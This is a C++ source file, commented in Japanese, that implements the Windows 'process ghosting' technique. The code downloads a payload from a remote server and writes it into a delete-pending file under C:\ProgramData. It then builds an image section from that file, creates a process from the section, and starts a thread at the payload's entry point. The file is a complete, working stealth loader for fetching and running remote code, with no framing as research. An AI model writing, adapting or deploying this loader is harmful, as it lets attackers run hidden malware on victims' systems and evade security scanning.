// プロセスゴースティング

#include "ProcessGhosting.h"
#include "NtStruct.h"

Arg arg;

pNtCreateProcessEx NtCreateProcessEx = reinterpret_cast<pNtCreateProcessEx>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateProcessEx"));
pNtCreateThreadEx NtCreateThreadEx = reinterpret_cast<pNtCreateThreadEx>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx"));
pNtCreateSection NtCreateSection = reinterpret_cast<pNtCreateSection>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateSection"));
pNtSetInformationFile NtSetInformationFile = reinterpret_cast<pNtSetInformationFile>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtSetInformationFile"));
pRtlCreateProcessParametersEx RtlCreateProcessParametersEx = reinterpret_cast<pRtlCreateProcessParametersEx>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlCreateProcessParametersEx"));


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

	// URLを構築
	std::wstring url = makeUrl(arg);

	// ファイルサーバーからペイロードをステージング
	std::vector<BYTE> payload;
	StagingPayload(url, payload);
	
	// ゴーストファイルを配置する場所を決める
	wchar_t tempPath[MAX_PATH];
	DWORD pathLen = GetTempPath(MAX_PATH, tempPath);
	std::wstring directory = L"C:\\ProgramData";
	std::wstring targetPath = directory + L"\\" + arg.fileName;

	// 空ファイルを作成して削除保留状態にする
	HANDLE targetFileHandle = CreateFile(targetPath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
	IO_STATUS_BLOCK status_block = {};
	FILE_DISPOSITION_INFORMATION info = {};
	info.DeleteFile = TRUE;
	NtSetInformationFile(targetFileHandle, &status_block, &info, sizeof(info), (FILE_INFORMATION_CLASS)FileDispositionInformation);

	// 空ファイルにペイロードを書き込む
	OVERLAPPED overped = {};
	WriteFile(targetFileHandle, payload.data(), payload.size(), nullptr, &overped);
	FlushFileBuffers(targetFileHandle);

	// ペイロードを元にセクションオブジェクトを作成
	HANDLE hSection = nullptr;
	NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, 0, PAGE_READONLY, SEC_IMAGE, targetFileHandle);

	// セクションオブジェクトからプロセスを作成
	HANDLE processHandle = nullptr;
	NtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, nullptr, GetCurrentProcess(), 4, hSection, nullptr, nullptr, FALSE);

	// 新規プロセスのPEBとPBIを読み取る
	PEB_ pebData = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	NtQueryInformationProcess(processHandle, ProcessBasicInformation, (LPVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr);
	ReadProcessMemory(processHandle, pbi.PebBaseAddress, &pebData, sizeof(PEB_), 0);

	// PEBからベースアドレス、エントリポイント、PEB構造体の先頭アドレスを取得
	ULONGLONG imageBaseAddress = (ULONGLONG)pebData.ImageBaseAddress;
	PIMAGE_DOS_HEADER pDosHander = (PIMAGE_DOS_HEADER)payload.data();
	PIMAGE_NT_HEADERS pHeadres = (PIMAGE_NT_HEADERS)(pDosHander->e_lfanew + (DWORD64)payload.data());
	ULONGLONG entryPointOffset = pHeadres->OptionalHeader.AddressOfEntryPoint;
	ULONGLONG entryPoint = entryPointOffset + imageBaseAddress;
	ULONGLONG pebBaseAddress = (ULONGLONG)pbi.PebBaseAddress;

	// UnicodeString型でファイルパスとディレクトリの変数を作成
	UNICODE_STRING uTargetPath = {};
	RtlInitUnicodeString(&uTargetPath, targetPath.c_str());
	UNICODE_STRING uCurrentDirectory = {};
	RtlInitUnicodeString(&uCurrentDirectory, directory.c_str());

	LPVOID environment;
	CreateEnvironmentBlock(&environment, NULL, TRUE);

	PRTL_USER_PROCESS_PARAMETERS_ params = nullptr;
	RtlCreateProcessParametersEx(reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(&params), reinterpret_cast<PUNICODE_STRING>(&uTargetPath), nullptr, reinterpret_cast<PUNICODE_STRING>(&uCurrentDirectory), reinterpret_cast<PUNICODE_STRING>(&uTargetPath), environment, nullptr, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED);
	LPVOID buffer = params;
	ULONG_PTR bufferEnd = (ULONG_PTR)params + params->Length;

	if (params->Environment) {
		if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
			buffer = (LPVOID)params->Environment;
		}
		ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
		if (env_end > bufferEnd) {
			bufferEnd = env_end;
		}
	}

	SIZE_T buffer_size = bufferEnd - (ULONG_PTR)buffer;
	VirtualAllocEx(processHandle, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(processHandle, (LPVOID)params, (LPVOID)params, params->Length, NULL);

	if (params->Environment) {
		WriteProcessMemory(processHandle, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL);
	}

	VirtualAllocEx(processHandle, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(processHandle, (LPVOID)params, (LPVOID)params, params->Length, NULL);

	if (params->Environment) {
		VirtualAllocEx(processHandle, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		WriteProcessMemory(processHandle, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL);
	}

	PEB_ peb_copy = {};
	ULONGLONG offset = (ULONGLONG)&peb_copy.ProcessParameters - (ULONGLONG)&peb_copy;
	LPVOID remote_img_base = (LPVOID)(pebBaseAddress + offset);
	WriteProcessMemory(processHandle, remote_img_base, &params, sizeof(PVOID), nullptr);

	// スレッドを作成
	HANDLE hThread = nullptr;
	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, processHandle, (LPTHREAD_START_ROUTINE)entryPoint, nullptr, FALSE, 0, 0, 0, nullptr);
}